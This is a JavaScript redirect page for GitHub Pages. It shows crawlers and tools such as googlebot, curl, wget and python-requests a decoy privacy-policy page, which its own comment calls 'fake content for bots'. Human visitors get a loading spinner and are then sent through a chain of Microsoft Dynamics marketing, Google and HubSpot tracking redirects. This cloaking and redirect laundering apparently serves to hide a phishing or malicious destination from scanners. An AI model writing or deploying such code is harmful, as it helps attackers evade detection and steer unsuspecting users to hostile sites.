// Simple Redirect Script with 4-Second Delay
// Compatible with GitHub Pages

(function() {
    'use strict';
    
    // Configuration
    const REDIRECT_URL = 'https://public-usa.mkt.dynamics.com/api/orgs/742da8ce-1b76-f011-8589-000d3a106307/r/8Uu2c1ToLUGfS8eugg4CAAIAAAA?msdynmkt_target=%7B%22TargetUrl%22%3A%22https%253A%252F%252Fwww.google.com%252Furl%253Fq%253Dhttps%25253A%25252F%25252Fdjyt-s04.eu1.hs-sales-engage.com%25252FCtc%25252FDQ%25252B23284%25252FdjYT-s04%25252FJll8VMXNW7YbdcM6lZ3ldW4dYkTk1Rrbh-W4tPVpb60ww0JV801_44gWhjKW5rqjJH5F1H7RW3QJ2681HBRQqN4QWjlSCKTbFW3rZcsT8Y-BC-W2NVKY_9dLn08W1_t_Vp7CtglFVZH6lx8MDHCwW2L9CGd3KHjt1W85p2wy4Vxb1lMLL8BlgWYWmW8rYBtj3fLWG7W4tpYXl4PCx10W6brBmy2bTLT8W86JWzW4_wgJcW2BVQrC1DNQHkVfx5BJ1NwZDtW5wkQZw5rFwGHW45gT5q7R9bSfW8dbz1K600zH-W1Zh_502nF7JQVGFBC27SZtkmW1JLPd67NRzcTW4xGvBk6rh7lRW7H8Lr11j9DPvVKZMFx93XZSgW7DzWF75pvFlLW8dMGjD70_V2kW2FbZcK8rF_gTW14GC0T4lrlTDW9b1PXf1-jkryW3KTkZ08Fx7ySW62fwDS9jjzBmW9b22Jb4f-dx3W3Z7Zjv6d-4tcW8QTVSH84KH_hW3h3By35VM83sW48ZNKx6RK8QkW7Ydwh_5dFZmNW45n-fS2RHN6DW9lnNtX1L9rb0W2m-pXX2KYh-dN6Y9thBmLDjkW2XK5Y02tDD3SW4vl5sY7mVZL1VsTbwX17gtnVW60BDYp6QGQk0W7yNm4h3mhmwpN5r4TrQrlHPrN3ccwj6t-P-bW7kpGbn68GwdHW398xDG6sbLCRW6Fkr9C5wWtlSW8fKrp-3PmdTgW6tWPSK3Wl6wNW25RtlS7HqjR7W91jRdf8m-DTJN8-D7MNNdh4KW8v7JJl5qCLCFW3DbcP090yNtSW5s8Wjf1qJ757W1B8xjl4TTxvJW7l8Z5t5LgPd9W35yK042g6zssW5K5PkN1Nd_MhW57H4HD4yrcJPW3H_rf77ckNnnN3ZtBF8c3hpPW5nhLKX7m4dvDW6Vx05W3Ljt_yW1zgw_N64Cq33W8b6wHg7726wGf5mwj0M04%2526sa%253DD%2526sntz%253D1%2526usg%253DAOvVaw2tpLERLriKYMm4csbeD_jo%22%2C%22RedirectOptions%22%3A%7B%225%22%3Anull%2C%221%22%3Anull%7D%7D&msdynmkt_digest=tJ7QG46gwp3uTHYYbojbBBeglZ308aNuXF%2FUyxOwWKg%3D&msdynmkt_secretVersion=a3955a744d9049f88dd8bdc1907bf2bf';
    const DELAY_SECONDS = 4;
    const LOADING_MESSAGE = 'Loading...';
    
    // Very minimal bot detection - only block obvious automated tools
    function isBot() {
        const userAgent = navigator.userAgent.toLowerCase();
        
        // Only block very obvious bots
        const botPatterns = [
            'googlebot', 'bingbot', 'slurp', 'facebookexternalhit',
            'curl', 'wget', 'python-requests', 'postman'
        ];
        
        return botPatterns.some(pattern => userAgent.includes(pattern));
    }
    
    // Create beautiful loading interface
    function createLoadingInterface() {
        // Clear existing content
        document.body.innerHTML = '';
        
        // Apply styles to body
        document.body.style.cssText = `
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: center;
        `;
        
        // Create main container
        const container = document.createElement('div');
        container.style.cssText = `
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
            max-width: 400px;
            width: 90%;
        `;
        
        // Create spinner
        const spinner = document.createElement('div');
        spinner.style.cssText = `
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        `;
        
        // Add CSS animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        document.head.appendChild(style);
        
        // Create loading message
        const message = document.createElement('h2');
        message.textContent = LOADING_MESSAGE;
        message.style.cssText = `
            margin: 0 0 20px;
            font-size: 24px;
            font-weight: 300;
        `;
        
        // Create countdown display
        const countdown = document.createElement('div');
        countdown.id = 'countdown';
        countdown.style.cssText = `
            font-size: 18px;
            opacity: 0.8;
        `;
        
        // Assemble the interface
        container.appendChild(spinner);
        container.appendChild(message);
        container.appendChild(countdown);
        document.body.appendChild(container);
        
        return countdown;
    }
    
    // Handle countdown and redirect
    function startRedirect() {
        const countdownEl = createLoadingInterface();
        let timeLeft = DELAY_SECONDS;
        
        const tick = () => {
            countdownEl.textContent = `Redirecting in ${timeLeft} seconds...`;
            
            if (timeLeft <= 0) {
                countdownEl.textContent = 'Redirecting now...';
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 500);
                return;
            }
            
            timeLeft--;
            setTimeout(tick, 1000);
        };
        
        tick();
    }
    
    // Show fake content for bots
    function showBotContent() {
        document.body.innerHTML = `
            <div style="margin: 20px; font-family: Arial, sans-serif;">
                <h1>Privacy Policy</h1>
                <p>This website respects your privacy and is committed to protecting your personal information.</p>
                <h2>Information We Collect</h2>
                <p>We may collect various types of information when you visit our website...</p>
                <h2>How We Use Information</h2>
                <p>We use the information we collect to provide and improve our services...</p>
                <h2>Contact Us</h2>
                <p>If you have questions about this Privacy Policy, please contact us at privacy@example.com</p>
            </div>
        `;
    }
    
    // Main function
    function init() {
        // Wait for DOM if needed
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
            return;
        }
        
        // Check if it's a bot
        if (isBot()) {
            showBotContent();
        } else {
            // Normal user - start redirect
            startRedirect();
        }
    }
    
    // Start the script
    init();
    
})();
